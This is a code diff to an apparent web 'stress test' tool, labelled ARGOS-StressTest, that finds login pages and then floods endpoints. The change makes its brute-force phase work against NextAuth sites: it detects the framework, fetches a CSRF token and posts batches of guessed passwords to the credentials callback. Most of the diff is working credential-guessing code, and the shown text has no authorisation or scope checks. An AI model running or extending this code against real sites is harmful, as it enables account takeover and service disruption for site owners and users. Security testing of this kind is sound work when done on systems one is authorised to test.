@@ -99,7 +99,14 @@ function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }
 // Phase 1: Brute Force Login
 // ═══════════════════════════════════════════════════════════════════════════
 
-async function findLoginPage(baseUrl: string): Promise<string | null> {
+interface LoginPageInfo {
+  loginUrl: string;
+  authEndpoint: string;
+  isNextAuth: boolean;
+  csrfToken: string;
+}
+
+async function findLoginPage(baseUrl: string): Promise<LoginPageInfo | null> {
   const parsed = new URL(baseUrl);
   const parts = parsed.hostname.split(".");
   const root = parts.length >= 2 ? parts.slice(-2).join(".") : parsed.hostname;
@@ -124,7 +131,30 @@ async function findLoginPage(baseUrl: string): Promise<string | null> {
           || (/<form/i.test(body) && /(?:password|login|sign.?in|connexion|e.?mail)/i.test(body))
           || /csrfToken|callbackUrl|credentials|next-auth|nextauth|__Host-next-auth|signIn\(|credential/i.test(body)
           || (/signin|sign-in|login/i.test(path) && body.length > 500);
-        if (hasLogin) return `${origin}${path}`;
+        if (!hasLogin) continue;
+
+        const foundOrigin = new URL(`${origin}${path}`).origin;
+        const loginUrl = `${origin}${path}`;
+        const isNextAuth = /csrfToken|callbackUrl|next-auth|nextauth|__Host-next-auth|__Secure-next-auth/i.test(body);
+
+        let csrfToken = "";
+        let authEndpoint = loginUrl;
+
+        if (isNextAuth) {
+          authEndpoint = `${foundOrigin}/api/auth/callback/credentials`;
+          try {
+            const csrfRes = await fetch(`${foundOrigin}/api/auth/csrf`, {
+              headers: { "User-Agent": "ARGOS-StressTest/1.0" },
+              signal: AbortSignal.timeout(5000),
+            });
+            if (csrfRes.ok) {
+              const csrfJson = await csrfRes.json();
+              csrfToken = csrfJson.csrfToken || "";
+            }
+          } catch { /* ignore */ }
+        }
+
+        return { loginUrl, authEndpoint, isNextAuth, csrfToken };
       } catch { /* skip */ }
     }
   }
@@ -132,22 +162,37 @@ async function findLoginPage(baseUrl: string): Promise<string | null> {
 }
 
 async function phaseBruteForce(
-  loginUrl: string | null,
+  loginInfo: LoginPageInfo | null,
   targetDomain: string,
   maxAttempts: number,
   emit: (data: Record<string, unknown>) => void,
 ): Promise<BruteForceResult> {
   const result: BruteForceResult = {
-    loginUrl,
+    loginUrl: loginInfo?.loginUrl ?? null,
     attemptsBeforeBlock: -1,
     totalAttempts: 0,
     defenses: [],
     stats: computeStats([]),
   };
 
-  if (!loginUrl) {
+  if (!loginInfo) {
     emit({ phase: "bruteforce", progress: 100, message: "Aucun formulaire de connexion trouve", stats: result.stats });
     return result;
+  }
+
+  const { authEndpoint, isNextAuth, csrfToken, loginUrl } = loginInfo;
+
+  function buildBody(username: string, password: string): string {
+    const params = new URLSearchParams();
+    params.set("username", username);
+    params.set("password", password);
+    params.set("email", username);
+    if (isNextAuth) {
+      if (csrfToken) params.set("csrfToken", csrfToken);
+      params.set("callbackUrl", loginUrl);
+      params.set("json", "true");
+    }
+    return params.toString();
   }
 
   const passwords = generatePasswordList(targetDomain).slice(0, maxAttempts);
@@ -169,13 +214,13 @@ async function phaseBruteForce(
     const promises = batch.map(async (pwd) => {
       const t0 = Date.now();
       try {
-        const res = await fetch(loginUrl, {
+        const res = await fetch(authEndpoint, {
           method: "POST",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": "ARGOS-StressTest/1.0",
           },
-          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(pwd)}&email=${encodeURIComponent(username)}`,
+          body: buildBody(username, pwd),
           redirect: "manual",
           signal: AbortSignal.timeout(8000),
         });
@@ -650,15 +695,17 @@ export async function POST(req: NextRequest) {
 
         // Phase 1: Brute Force
         emit({ phase: "bruteforce", progress: 0, message: "Phase 1: Detection du formulaire de connexion..." });
-        const loginUrl = await findLoginPage(url);
-        emit({ phase: "bruteforce", progress: 5, message: loginUrl ? `Login trouve: ${loginUrl}` : "Aucun login detecte — test brute force reduit" });
+        const loginInfo = await findLoginPage(url);
+        emit({ phase: "bruteforce", progress: 5, message: loginInfo
+          ? `Login trouve: ${loginInfo.loginUrl}${loginInfo.isNextAuth ? ` → API: ${loginInfo.authEndpoint}` : ""}`
+          : "Aucun login detecte — test brute force reduit" });
 
-        const bruteResult = await phaseBruteForce(loginUrl, new URL(url).hostname, maxBruteForce, emit);
+        const bruteResult = await phaseBruteForce(loginInfo, new URL(url).hostname, maxBruteForce, emit);
         emit({ phase: "bruteforce", progress: 100, message: `Phase 1 terminee: ${bruteResult.totalAttempts} tentatives, ${bruteResult.defenses.length} defenses detectees` });
 
         // Phase 2: Flood
         emit({ phase: "flood", progress: 0, message: "Phase 2: Test de charge sur les endpoints..." });
-        const floodResults = await phaseFlood(url, loginUrl, emit);
+        const floodResults = await phaseFlood(url, loginInfo?.loginUrl ?? null, emit);
         emit({ phase: "flood", progress: 100, message: `Phase 2 terminee: ${floodResults.length} endpoints testes` });
 
         // Phase 3: Ramp-up
